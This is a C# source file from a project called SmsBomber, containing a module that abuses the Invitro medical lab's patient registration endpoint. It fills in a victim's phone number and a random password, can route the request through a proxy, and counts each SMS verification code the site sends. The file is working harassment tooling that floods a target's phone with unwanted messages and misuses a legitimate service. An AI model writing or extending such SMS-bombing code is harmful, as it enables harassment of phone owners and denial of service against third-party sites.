using Leaf.xNet;
using static SmsBomber.ReturnTypes;

namespace SmsBomber.SmsService.Sites
{
    internal class Invitro
    {
        public static ResponseSendSms SendSms()
        {
            using (var request = new HttpRequest())
            {
                string password = Methods.GenerateRandomPassword(10);
                var reqParams = new RequestParams();
                reqParams["emailOrPhone"] = $"+{Globals.WorkingData.PhoneNumber}";
                reqParams["password"] = password;
                reqParams["passwordConfirmation"] = password;
                reqParams["termsAgreeBox"] = "on";
                reqParams["nextStep"] = "1";
                reqParams["termsAgree"] = "1";
                if (!string.IsNullOrWhiteSpace(Globals.WorkingData.ProxyAdress)) { request.Proxy = ProxyClient.Parse(Globals.WorkingData.ProxyTypeLeaf, Globals.WorkingData.ProxyAdress); }
                try
                {
                    request.Post($"{DomainList.Invitro}/lk2/lka/patient/registration", reqParams).ToString();
                }
                catch
                {
                    return new ResponseSendSms { FailedConnected = !request.HttpIsConnected(), SuccessSend = false };
                }

                if (request.Response.ToString().Contains("Мы выслали вам код на номер"))
                {
                    Globals.WorkingStats.CountSendingSms++;
                    return new ResponseSendSms { SuccessSend = true };
                }
                return new ResponseSendSms { SuccessSend = false };
            }
        }
    }
}
